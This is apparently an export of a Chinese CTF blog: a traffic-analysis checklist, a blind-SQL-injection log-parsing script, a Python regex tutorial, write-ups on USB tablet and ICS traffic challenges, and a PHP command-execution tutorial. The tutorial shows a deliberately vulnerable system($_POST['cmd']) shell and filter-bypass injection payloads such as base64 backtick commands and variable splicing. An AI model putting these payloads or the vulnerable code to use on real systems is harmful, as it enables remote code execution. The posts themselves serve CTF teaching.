<h3 id="能从流量包中提取出文件的"><a href="#能从流量包中提取出文件的" class="headerlink" title="能从流量包中提取出文件的"></a>能从流量包中提取出文件的</h3><p>这一块大部分都能通过导出文件这一操作来实现，当然有些时候用binwalk或者是formost分离出来，如果这个文件是在流量包中的，那么这两个工具提取可能没有那么顺利，比如说一个图片可能能提出来，但是损坏了，这样很影响后边的判断。但是如果是流量文件隐写了个文件，这俩工具还是挺好用的。</p>
<p>导出文件操作呢，不熟悉wireshark的可能不会</p>
<p>具体就是</p>
<p><code>左上角文件—&gt;导出对象</code></p>
<p><img src="https://s1.ax1x.com/2022/06/17/Xb0t3t.png"></p>
<p>还有一种是流量包中存在被base64编码过的文件</p>
<p>经典的菜刀666，之前也有写过，在<a href="https://charmersix.icu/2022/05/03/SkyMirror-WP-simple-flow/">这里</a></p>
<h3 id="SQL盲注流量"><a href="#SQL盲注流量" class="headerlink" title="SQL盲注流量"></a>SQL盲注流量</h3><p>这一块在日志分析，流量分析中都会涉及，考到了也不难，就是那一种题型</p>
<p>之前也在<a href="https://charmersix.icu/2022/04/29/SQLflow/">这里</a>写过</p>
<p>之前没有提供脚本，这边给大家一个，但是需要根据具体题目自己改一改</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#GET /index.php?act=news&amp;id=1%20and%20ascii(substr(((select%20concat_ws(char(94),%20flag)%20%20from%20db_flag.tb_flag%20%20limit%200,1)),%2038,%201))&gt;125</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">a = []</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span> (<span class="string">&quot;sqltest.pcapng&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:<span class="comment">#读取pcap文件</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> f.readlines():</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">b&quot;id=1%20and%20ascii(substr(((select%20concat_ws(char(94),%20flag)%20%20from%20db_flag.tb_flag%20%20limit%200,1)),&quot;</span> <span class="keyword">in</span> i):</span><br><span class="line">            <span class="comment">#print(i)</span></span><br><span class="line">            a.append(i)<span class="comment">#把这些东西搞到a数组里</span></span><br><span class="line">a1 = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="comment">#print(i)</span></span><br><span class="line">    b = re.search(<span class="string">br&quot;%200,1\)\),%20(\d+),%201\)\)&quot;</span>,i).group(<span class="number">1</span>)</span><br><span class="line">    c = re.search(<span class="string">br&quot;&gt;(\d+) HTTP/1.1&quot;</span>,i).group(<span class="number">1</span>)</span><br><span class="line">    <span class="comment">#print(b)</span></span><br><span class="line">    <span class="comment">#print(c)</span></span><br><span class="line">    a1[<span class="built_in">int</span>(b)] = <span class="built_in">int</span>(c)</span><br><span class="line"><span class="comment">#从a开始调出来</span></span><br><span class="line"><span class="comment">#print(a1)</span></span><br><span class="line">flag =<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">1</span>,<span class="number">39</span>):</span><br><span class="line">    flag+=(<span class="built_in">chr</span>(a1[i]))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#整成一行</span></span><br></pre></td></tr></table></figure>

<h3 id="USB流量分析"><a href="#USB流量分析" class="headerlink" title="USB流量分析"></a>USB流量分析</h3><p>这一块常考的就是键鼠，都考烂了，应该不会难，2022国赛换汤不换出了一个，也是给我整懵逼了，这里边分了两块，一部分是能跑出个压缩包，另一部分是密码，刚开始没意识到，跑出来rar损坏，然后把队友思路都整偏了，都在修rar，我的错我的错。</p>
<p>比较难的，见过一个数位板<a href="https://charmersix.icu/2022/04/30/usb%20wireshark/">这里</a>写过</p>
<p>还可能会出现一些手柄，刻字机啥的。</p>
<p>然后推荐雪殇以及其他两位大佬共同写的一个工具，只能说tql</p>
<p>工具在<a href="https://github.com/jiayuqi7813/knm">这里</a></p>
<h3 id="根据题目要求做题"><a href="#根据题目要求做题" class="headerlink" title="根据题目要求做题"></a>根据题目要求做题</h3><p>这部分一定要认真读题，可能并不是找flag，一定要看清楚让你找啥，比如说一些工控题目，webshell比如<a href="https://charmersix.icu/2022/04/29/webshell/">这个</a></p>
<p>这部分里也有你从未接触过的知识，这样可以仔细看一下追踪流，找找有什么规律，比如2021国赛题目robot，之前也是写过</p>
<p>还有就是第二届网刃杯：喜欢移动的黑客、LED_BOOM</p>
<p>一定一定要认真读题，认真分析，认真找规律。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>流量分析大体思路</p>
<blockquote>
<ol>
<li>拿到后，先看一下题目题干，然后先find</li>
<li>如果没有找到，看一下是不是http，若果是先统计http请求看一下，或者是放到科莱里，总体看一下</li>
<li>导出对象，看一下</li>
<li>追踪流，挨个流看，如果很多，倒着看</li>
<li>string跑一下</li>
<li>是不是usb，跑脚本</li>
<li>有没有隐写</li>
<li>有没有大串编码</li>
<li>从来没见过的协议，去百度</li>
<li>记得把文件放010editor里看一下</li>
</ol>
</blockquote>
<p>这部分还算是比较简单，算是基础吧，像那些WiFi，被加密过的流量，都还没有写，因为那些我也玩的不遛</p>
]]></content>
      <tags>
        <tag>flow</tag>
        <tag>Misc</tag>
        <tag>study</tag>
      </tags>
  </entry>
  <entry>
    <title>python re模块</title>
    <url>/2022/05/03/python%20re/</url>
    <content><![CDATA[<p>初识re</p>
<h3 id="findall"><a href="#findall" class="headerlink" title="findall"></a>findall</h3><p>findall : 匹配字符串中所有的符合正则内容</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="built_in">list</span> = re.findall(<span class="string">r&quot;\d+&quot;</span>,<span class="string">&quot;my phone number is : 10086 ; my girlfriend&#x27;s phonenumber is : 10010&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>)</span><br></pre></td></tr></table></figure>

<h3 id="finditer"><a href="#finditer" class="headerlink" title="finditer"></a>finditer</h3><p>finditer : 匹配字符串中所有内容（返回的是迭代器）;从迭代器里拿到内容需要.group()</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">it = re.finditer(<span class="string">r&quot;\d+&quot;</span>,<span class="string">&quot;my phone number is : 10086 ; my girlfriend&#x27;s phonenumber is : 10010&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> it :</span><br><span class="line">    <span class="built_in">print</span>(i.group())</span><br></pre></td></tr></table></figure>

<h3 id="search"><a href="#search" class="headerlink" title="search"></a>search</h3><p>search : 找到一个结果就返回，返回结果是match对象，需要.group()</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">s = re.search(<span class="string">r&quot;\d+&quot;</span>,<span class="string">&quot;my phone number is : 10086 ; my girlfriend&#x27;s phonenumber is : 10010&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(s.group())</span><br></pre></td></tr></table></figure>

<h3 id="match"><a href="#match" class="headerlink" title="match"></a>match</h3><p>match : 从头开始匹配</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">m = re.match(<span class="string">r&quot;\d+&quot;</span>,<span class="string">&quot;my phone number is : 10086 ; my girlfriend&#x27;s phonenumber is : 10010&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(m.group())</span><br></pre></td></tr></table></figure>

<h3 id="预加载正则表达"><a href="#预加载正则表达" class="headerlink" title="预加载正则表达"></a>预加载正则表达</h3><p>先正则匹配，再re</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">obj = re.<span class="built_in">compile</span>(<span class="string">r&quot;\d+&quot;</span>)</span><br><span class="line"></span><br><span class="line">ret =  obj.finditer(<span class="string">&quot;my phone number is : 10086 ; my girlfriend&#x27;s phonenumber is : 10010&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> it <span class="keyword">in</span> ret : </span><br><span class="line">    <span class="built_in">print</span>(it.group())</span><br></pre></td></tr></table></figure>

<h4 id="一个鲜明的预加载例子"><a href="#一个鲜明的预加载例子" class="headerlink" title="一个鲜明的预加载例子"></a>一个鲜明的预加载例子</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">a = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;div class= &#x27;jay&#x27;&gt;&lt;span id= &#x27;1&#x27;&gt;郭麒麟&lt;/span&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;div class= &#x27;jj&#x27;&gt;&lt;span id= &#x27;2&#x27;&gt;郭德纲&lt;/span&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;div class= &#x27;mike&#x27;&gt;&lt;span id= &#x27;3&#x27;&gt;于谦&lt;/span&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;div class= &#x27;jack&#x27;&gt;&lt;span id= &#x27;4&#x27;&gt;岳云鹏&lt;/span&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment">#  (?P&lt;分组名字&gt;正则) 可以单独从正则匹配内容中提取所需</span></span><br><span class="line">obj = re.<span class="built_in">compile</span>(<span class="string">r&quot;&lt;div class= &#x27;(?P&lt;english&gt;.*?)&#x27;&gt;&lt;span id= &#x27;(?P&lt;id&gt;\d+)&#x27;&gt;(?P&lt;德云社&gt;.*?)&lt;/span&gt;&lt;/div&gt;&quot;</span>, re.S)<span class="comment">#让. 能匹配到换行符</span></span><br><span class="line">result = obj.finditer(a)</span><br><span class="line"><span class="keyword">for</span> it <span class="keyword">in</span> result :</span><br><span class="line">    <span class="built_in">print</span>(it.group(<span class="string">&quot;english&quot;</span>))</span><br><span class="line">    <span class="built_in">print</span>(it.group(<span class="string">&quot;id&quot;</span>))</span><br><span class="line">    <span class="built_in">print</span>(it.group(<span class="string">&quot;德云社&quot;</span>))</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>(陇剑杯 2021)日志分析系列</title>
    <url>/2022/05/24/rizhifenxi/</url>
    <content><![CDATA[<p>这一系列一共有两部分，一部分是日志分析的三个题目，另一部分是简单的日志分析</p>
<h3 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h3><h4 id="（1）"><a href="#（1）" class="headerlink" title="（1）"></a>（1）</h4><p>这题让找源码文件，根据经验，源码一般放在<code>www/wwwroot</code>下边</p>
<p>直接CTRL+F找一下，果然有。</p>
<p><img src="https://img-blog.csdnimg.cn/6c1fc74849f34c4fa88aa1c463ebe12b.png"></p>
<h4 id="（2）"><a href="#（2）" class="headerlink" title="（2）"></a>（2）</h4><p>一眼顶针</p>
<p><img src="https://img-blog.csdnimg.cn/6a162b49eba64f8e95b301d920e42b09.png"></p>
<p>解码看看</p>
<p><img src="https://img-blog.csdnimg.cn/843d004995324ac8920d46c29bb00008.png"></p>
<p>这不很明显<code>sess_car</code></p>
<h4 id="（3）"><a href="#（3）" class="headerlink" title="（3）"></a>（3）</h4><p>从（2）能看出一段反序列化，那么类自然就是<code>SplFileObject</code></p>
<h3 id="简单日志分析"><a href="#简单日志分析" class="headerlink" title="简单日志分析"></a>简单日志分析</h3><h4 id="（1）-1"><a href="#（1）-1" class="headerlink" title="（1）"></a>（1）</h4><p>打开浏览一下</p>
<p><img src="https://img-blog.csdnimg.cn/d2daa3d491744701bcf4d3fccfc5fa99.png"></p>
<p>发现这么个东西，像极了base64</p>
<p>解码看，懂的都懂</p>
<p><img src="https://img-blog.csdnimg.cn/9a562992d88145a0a626046506e9e8e0.png"></p>
<p>参数就是<code>user</code>了</p>
<h4 id="（2）-1"><a href="#（2）-1" class="headerlink" title="（2）"></a>（2）</h4><p>又见base64</p>
<p><img src="https://img-blog.csdnimg.cn/d5ac6159e3784ee9a06591ac9be8ee4d.png"></p>
<h4 id="（3）-1"><a href="#（3）-1" class="headerlink" title="（3）"></a>（3）</h4><p>还是base64，好没劲啊</p>
<p><img src="https://img-blog.csdnimg.cn/782157cc0e814fa2a6a8efdfd35436ed.png"></p>
]]></content>
      <tags>
        <tag>wp</tag>
        <tag>flow</tag>
        <tag>Misc</tag>
      </tags>
  </entry>
  <entry>
    <title>SkyMirror_WP_USB流量分析</title>
    <url>/2022/04/30/usb%20wireshark/</url>
    <content><![CDATA[<h3 id="RoarCTF2019-davinci-cipher-数位板流量分析"><a href="#RoarCTF2019-davinci-cipher-数位板流量分析" class="headerlink" title="(RoarCTF2019)davinci_cipher_数位板流量分析"></a>(RoarCTF2019)davinci_cipher_<em>数位板流量分析</em></h3><p>这是我目前做的比较难的一个流量分析，这题干扰项超级多，但是根据提示能知道是个usb流量分析，如果没有这个提示，做这个题绝对是超级艰难；题目在<a href="http://ctfer.club/challenges#[RoarCTF2019]davinci_cipher-116">这儿</a></p>
<p>首先flag.txt：通过百度，可以得出是一串emoji的Unicode的编码，可以来<a href="https://r12a.github.io/app-conversion/">这里</a>解码一下</p>
<p>然后经过初步的流量分析（或者说是看提示），可以看出有一串非常可疑的USB流量tshark分离一下</p>
<blockquote>
<p>tshark -r k3y.pcapng -T fields -e usbhid.data &gt; usbdata.txt</p>
</blockquote>
<p>看别的大佬的博客，学到了一种处理空白数据的方法</p>
<blockquote>
<p>tshark -r ‘k3y.pcapng’ -T fields -e usbhid.data |sed ‘/^$/d’ &gt; usbdata.txt</p>
</blockquote>
<p>再看流量，看到了wacom是一块数位板</p>
<p><img src="https://s1.ax1x.com/2022/04/30/OSGoJ1.png"></p>
<p>wacom是有压感的绘图板，详细说明在<a href="https://www.usb.org/sites/default/files/documents/hut1_12v2.pdf">USB协议文档</a>里的<strong>Figure 19</strong>：</p>
<p><img src="https://s1.ax1x.com/2022/04/30/OSGTRx.png"></p>
<p>一般都是x坐标2个字节，Y坐标也是2个字节，又因为X，Y坐标均以小端方式存储，因此画图坐标个位数字变化会大一些。猜测坐标如图所示（深紫X，浅蓝Y，红色压感）。</p>
<p><img src="https://s1.ax1x.com/2022/04/30/OSGIiR.png"></p>
<p>开始处理一下有用数据</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="built_in">open</span>(<span class="string">&quot;coor.txt&quot;</span>,<span class="string">&#x27;a+&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&quot;usbdata.txt&quot;</span>,<span class="string">&#x27;r&#x27;</span>):</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">len</span>(line)==<span class="number">55</span>):</span><br><span class="line">        a.write(line)</span><br><span class="line"><span class="comment">#把没必要的数据过滤掉，依据长度</span></span><br><span class="line">a.close()</span><br></pre></td></tr></table></figure>

<p>剃掉压感为0的数据，把坐标提取出来还原成10进制。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="built_in">open</span>(<span class="string">&quot;finish.txt&quot;</span>,<span class="string">&#x27;a+&#x27;</span>)</span><br><span class="line">x1 = []</span><br><span class="line">y1 = []</span><br><span class="line">x2 = []</span><br><span class="line">y2 = []</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&quot;coor.txt&quot;</span>,<span class="string">&#x27;r&#x27;</span>):</span><br><span class="line">    <span class="keyword">if</span>(line[<span class="number">16</span>:<span class="number">18</span>]!=<span class="string">&quot;00&quot;</span>):</span><br><span class="line">        x1.append(line[<span class="number">4</span>:<span class="number">8</span>])</span><br><span class="line">        y1.append(line[<span class="number">10</span>:<span class="number">14</span>])</span><br><span class="line"><span class="comment">#筛选必要的坐标数据</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> x1:</span><br><span class="line">    x2.append(<span class="built_in">int</span>(i[<span class="number">2</span>:<span class="number">4</span>]+i[<span class="number">0</span>:<span class="number">2</span>],<span class="number">16</span>))</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> y1:</span><br><span class="line">    y2.append(<span class="built_in">int</span>(j[<span class="number">2</span>:<span class="number">4</span>]+j[<span class="number">0</span>:<span class="number">2</span>],<span class="number">16</span>))</span><br><span class="line"><span class="comment">#把十六进制坐标转为十进制</span></span><br><span class="line"><span class="keyword">for</span> z <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x2)):<span class="comment">#根据 一般都是x坐标2个字节，Y坐标也是2个字节 再判断一下</span></span><br><span class="line">    a.write(<span class="built_in">str</span>(x2[z])+<span class="string">&quot; &quot;</span>+<span class="built_in">str</span>(y2[z])+<span class="string">&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>然后放到gnuplot</p>
<blockquote>
<p>plot “finish.txt”</p>
</blockquote>
<p><img src="https://s1.ax1x.com/2022/04/30/OSG4o9.png"></p>
<p>反转一下得到</p>
<blockquote>
<p>MONA_LISA_IS_A_MAN</p>
</blockquote>
<p>用第一步flag.txt里的emoji作为密文，上步得出的字符串作为密钥，<a href="https://aghorler.github.io/emoji-aes/#">emoji解密</a>，得到flag。</p>
]]></content>
      <tags>
        <tag>wp</tag>
        <tag>SkyMirror</tag>
        <tag>python</tag>
        <tag>USB_flow</tag>
      </tags>
  </entry>
  <entry>
    <title>（2022第二届网刃杯） ISC</title>
    <url>/2022/04/29/wangren2022ics/</url>
    <content><![CDATA[<h3 id="ncsubj"><a href="#ncsubj" class="headerlink" title="ncsubj"></a>ncsubj</h3><p>这题主要考点是编码方面，打开，追踪流一下，发现奇奇怪怪编码</p>
<img src="https://img-blog.csdnimg.cn/e99722acc11740919d172799f392ed56.png" style="zoom:67%;" />

<p>三段，长得很像base64，解码看看</p>
<p><img src="https://img-blog.csdnimg.cn/3151d795090546dc9f1393f9c5273a9e.png"></p>
<p>果然，没有想象的那么简单，继续解码</p>
<p><img src="https://img-blog.csdnimg.cn/1dee0d006c7f4fbfae834a9652ee0caa.png"></p>
<p>whatancsubject很像，还真是</p>
<h3 id="喜欢移动的黑客"><a href="#喜欢移动的黑客" class="headerlink" title="喜欢移动的黑客"></a>喜欢移动的黑客</h3><p>比赛时候，正常开，打不开，分了一下，出来了个压缩包，就以为是压缩包，然后思路走偏了。</p>
<p>之前从来没有接触过流量的文件头，也没看出来，这次涨姿势了。</p>
<p>把题目中的pcapang和正常的pcapang放一起，会很明显发现文件头不一样，头四位前面改成 0A0D0D0A ，就能正常打开</p>
<p>继续看，结合提议，筛选出modbus，流量中的数据一般是HEX，所以算一下10000的HEX = 2710</p>
<p>继续翻找，发现异常</p>
<p><img src="https://img-blog.csdnimg.cn/9462a093fd564a8c8c3e53a53e07ffb7.png"></p>
<p>转回10进制，10086，拼接68156</p>
<p>得到flag</p>
<h3 id="xyp07"><a href="#xyp07" class="headerlink" title="xyp07"></a>xyp07</h3><p>这题推荐一款工具<code>科来网络分析系统</code>官网是能下到的</p>
<p>也不知道是不是巧合，我也是第一次用这款工具，</p>
<p>咱们直接打开，把流量包一扔，它就诊断出来了</p>
<p><img src="https://img-blog.csdnimg.cn/9bac756c1a034cdfa368545b8b0b0394.png"></p>
<p>打开一翻，出现奇怪东西</p>
<p><img src="https://img-blog.csdnimg.cn/b6e0d190c47042a485fcca76366c848e.png"></p>
<p>解码，base91</p>
<img src="https://img-blog.csdnimg.cn/80431d5e0fe2416eb7a0e97282036c45.png" style="zoom:67%;" />

<h3 id="cryptolalia"><a href="#cryptolalia" class="headerlink" title="cryptolalia"></a>cryptolalia</h3><p>题目在<a href="http://ctfer.club/challenges#cryptolalia-134">这儿</a></p>
<p>题目附件为一张图片，直接修改后缀，能得到一个压缩包，压缩包注释一条鱼，并且放出hint：鱼很重要</p>
<p>暂时不知道有什么用，继续看</p>
<p>又有hint，能爆破，果然爆破出<code>污泥脱水间数据详情</code>的密码</p>
<img src="https://img-blog.csdnimg.cn/d80d3e85b28d4fb7b67cd221b856dd10.png" style="zoom:67%;" />

<p>打开流量，懵逼了，猜测被加密过，追踪TCP流发现</p>
<p><img src="https://img-blog.csdnimg.cn/52db43206a334d3e950f52a9a91ab9c2.png"></p>
<p>发现似乎密文<code>U2FsdGVkX19pczQKWsMcjgrJt8f09dSN</code></p>
<p>来到<a href="https://www.sojson.com/encrypt.html">这里</a>，联想fish</p>
<p>解码得到<img src="https://img-blog.csdnimg.cn/85447d32f06243a1aa25c4088dae7e0c.png"></p>
<p>得到<code>设备药剂间数据详情</code>压缩包密码，解压后又一压缩包和txt，txt最后说<code>年轻人，有时候眼见不一定为实！</code></p>
<p>什么意思，莫非是伪加密，好家伙，一修复就好了</p>
<p>解压又得到一流量</p>
<p>无脑追踪流，0流就发现异常</p>
<p><img src="https://img-blog.csdnimg.cn/2ae09c7c517f47b79b4cd96354ad8d07.png"></p>
<p>把图片导出来，修改高度就能得到</p>
<p><img src="https://img-blog.csdnimg.cn/7e9c664607dd4ad29b5240908c7c414c.png"></p>
<h3 id="LED-BOOM"><a href="#LED-BOOM" class="headerlink" title="LED_BOOM"></a>LED_BOOM</h3><p>这题不难，认真读题很重要，搞安全一定要对一切信息很敏感</p>
<p>这题当时没有认真读题，所以没有做出来</p>
<p>先看题，题目在<a href="http://ctfer.club/challenges#LED_BOOM-131">这儿</a></p>
<p><img src="https://s1.ax1x.com/2022/04/30/OSFMM6.png"></p>
<p>雪殇直接一眼顶针AES，我是一眼看不出来，得猜</p>
<p><img src="https://s1.ax1x.com/2022/04/30/OSFuxx.png"></p>
<p>题干在这里，<code>强调三次</code>筛选一下s7comm，按照长度，会发现有三个length相同的包，细看发现了LED:On ，Off</p>
<p><img src="https://s1.ax1x.com/2022/04/30/OSA454.png"></p>
<p>得到<code>585692787</code></p>
<p>结合图片中的密文，<code>U2FsdGVkX19cOOV8qLVgcso8U4fse+7LirQKiHFkn9HU9BuwFAivH1siJXg/Rk6z</code>解秘一下</p>
<p>在<a href="https://www.sojson.com/encrypt_aes.html">这里</a>解码得到</p>
<p><img src="https://s1.ax1x.com/2022/04/30/OSVMfH.png"></p>
]]></content>
      <tags>
        <tag>wp</tag>
        <tag>flow</tag>
        <tag>SkyMirror</tag>
        <tag>ISC</tag>
      </tags>
  </entry>
  <entry>
    <title>Web_2_PHP命令执行+代码执行</title>
    <url>/2022/09/07/web_2/</url>
    <content><![CDATA[<h2 id="第一节-php的基础知识"><a href="#第一节-php的基础知识" class="headerlink" title="第一节 php的基础知识"></a>第一节 php的基础知识</h2><h3 id="0x1-php的基本概念"><a href="#0x1-php的基本概念" class="headerlink" title="0x1 php的基本概念"></a>0x1 php的基本概念</h3><p>php是网站的一种脚本语言，文件后缀是php，用来写网站，适合中小型网站的开发。</p>
<h3 id="0x2-php环境的安装"><a href="#0x2-php环境的安装" class="headerlink" title="0x2 php环境的安装"></a>0x2 php环境的安装</h3><h4 id="php-的运行环境"><a href="#php-的运行环境" class="headerlink" title="php 的运行环境"></a>php 的运行环境</h4><p>phpstudy</p>
<h4 id="php-的开发环境"><a href="#php-的开发环境" class="headerlink" title="php 的开发环境"></a>php 的开发环境</h4><p>? 区分文件和参数部分</p>
<p>参数部分 用 &amp; 区分 多个键值对</p>
<p>单个键值对用 = 分开</p>
<h3 id="0x3-php写一个hello-world"><a href="#0x3-php写一个hello-world" class="headerlink" title="0x3 php写一个hello world"></a>0x3 php写一个hello world</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;hello world&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="0x3-php基础语法"><a href="#0x3-php基础语法" class="headerlink" title="0x3 php基础语法"></a>0x3 php基础语法</h3><h4 id="GET"><a href="#GET" class="headerlink" title="$_GET"></a>$_GET</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="POST"><a href="#POST" class="headerlink" title="$_POST"></a>$_POST</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params"><span class="variable">$a</span>,<span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$a</span>+<span class="variable">$b</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">add</span>(<span class="variable">$a</span>,<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="危险函数"><a href="#危险函数" class="headerlink" title="危险函数"></a>危险函数</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="第二节-php的命令执行"><a href="#第二节-php的命令执行" class="headerlink" title="第二节 php的命令执行"></a>第二节 php的命令执行</h2><h3 id="0x1-什么是命令执行"><a href="#0x1-什么是命令执行" class="headerlink" title="0x1 什么是命令执行"></a>0x1 什么是命令执行</h3><p>RCE</p>
<h3 id="0x2-php的command-exec函数"><a href="#0x2-php的command-exec函数" class="headerlink" title="0x2 php的command exec函数"></a>0x2 php的command exec函数</h3><p>PHP官方有下面六种函数可以执行系统命令</p>
<ul>
<li>system</li>
<li>passthru</li>
<li>exec</li>
<li>shell_exec</li>
<li>popen</li>
<li>pcntl_exec4</li>
<li>执行运算符</li>
</ul>
<h3 id="0x3-php的命令执行利用"><a href="#0x3-php的命令执行利用" class="headerlink" title="0x3 php的命令执行利用"></a>0x3 php的命令执行利用</h3><p>php的命令执行，我们默认讨论的是服务器系统为Linux</p>
<p>shell 的<code>分号 ;</code> 可以用来分割两条命令</p>
<p>并列命令&amp;&amp;的url编码(%26%26) 也可以分割两条命令   but &amp;&amp;前的命令成功执行，后面的才会成立</p>
<p>|| 表示或 ， 可以分割两条命令</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); <span class="comment">//不显示报错</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); <span class="comment">//代码高亮</span></span><br></pre></td></tr></table></figure>

<h4 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h4><h5 id="base64编码绕过"><a href="#base64编码绕过" class="headerlink" title="base64编码绕过"></a>base64编码绕过</h5><p>如果 flag/cat 等命令被过滤，可以使用正则、其他未被过滤命令、base64编码解码</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">`echo dGFjIGZsYWcucGhw | base64 -d`</span><br></pre></td></tr></table></figure>

<blockquote>
<p>在linux当中反引号也十分常用，也就是 ` 符号。那么反引号是怎么使用的呢？我的理解是凡是打上反引号的命令，首先将反引号内的命令执行一次，然后再将已经执行过的命令得到的结果再执行一次，就可以得到我们反引号的输出</p>
</blockquote>
<h5 id="变量拼接绕过关键字"><a href="#变量拼接绕过关键字" class="headerlink" title="变量拼接绕过关键字"></a>变量拼接绕过关键字</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">a=c;b=at;c=fla;d=g.php;$a$b $&#123;c&#125;$&#123;d&#125;</span><br></pre></td></tr></table></figure>

<h5 id="爆破被过滤的符号"><a href="#爆破被过滤的符号" class="headerlink" title="爆破被过滤的符号"></a>爆破被过滤的符号</h5><p>符号被过滤可以爆破一下，</p>
<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209032135840.png" alt="image-20220903213502790" style="zoom: 67%;" />

<p>可以使用{}和冒号: 截取空格</p>
<p>使用env浏览环境变量，然后截取</p>
<p>例如<code>GPG_KEYS=CBAF69F173A0FEA4B537F470D66C9593118BCCB6 F38252826ACD957EF380D39F2F7956BC5DA04B5D</code></p>
<p><code>cmd=tac$&#123;GPG_KEYS:40:1&#125;*</code></p>
<h4 id="不回显"><a href="#不回显" class="headerlink" title="不回显"></a>不回显</h4><p>没办法直接看到回显，可以使用写文件的方式，将结果写到浏览器可以读取的位置，然后访问url+1.txt</p>
